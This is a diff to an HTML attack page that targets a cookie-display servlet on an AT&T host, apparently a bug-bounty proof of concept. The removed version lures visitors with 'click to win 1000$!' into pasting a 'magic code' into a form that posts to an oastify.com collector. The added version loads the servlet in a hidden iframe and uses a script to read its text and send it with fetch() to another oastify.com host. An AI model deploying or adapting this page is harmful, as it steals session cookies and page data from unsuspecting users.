@@ -13,16 +13,27 @@
   COPY THE TEXT BELOW
   </h2>
 
-  <iframe id="fgframe" height="650px" width="400px" src="https://cpr.att.com:8443/examples/servlets/servlet/CookieExample"></iframe>
+<iframe id="leak" 
+  src="https://cpr.att.com:8443/examples/servlets/servlet/CookieExample" 
+  style="width:0;height:0;border:0;display:none;"></iframe>
 
-  <form action="http://u837sr0beyye3rxjxh3nnk7x3o9fx6lv.oastify.com" method="POST">
-    <div>
-      <label for="say">PASTE THE MAGIC CODE HERE</label><br>
-      <textarea id="cookie" name="cookie" rows="4" cols="50"></textarea>
-    </div>
-    <div>
-      <button>click to win 1000$!</button>
-    </div>
-  </form>
+<script>
+setTimeout(() => {
+  try {
+    const iframe = document.getElementById('leak');
+    const doc = iframe.contentDocument || iframe.contentWindow.document;
+    const bodyText = doc.body.innerText;
+
+    fetch("https://0z0djxrh54pkuxoponuteqy3uu0lodc2.oastify.com", {
+      method: "POST",
+      mode: "no-cors",
+      body: bodyText
+    });
+  } catch (e) {
+    console.error("Failed to read iframe contents:", e);
+  }
+}, 2000);
+</script>
+
 </body>
 </html>
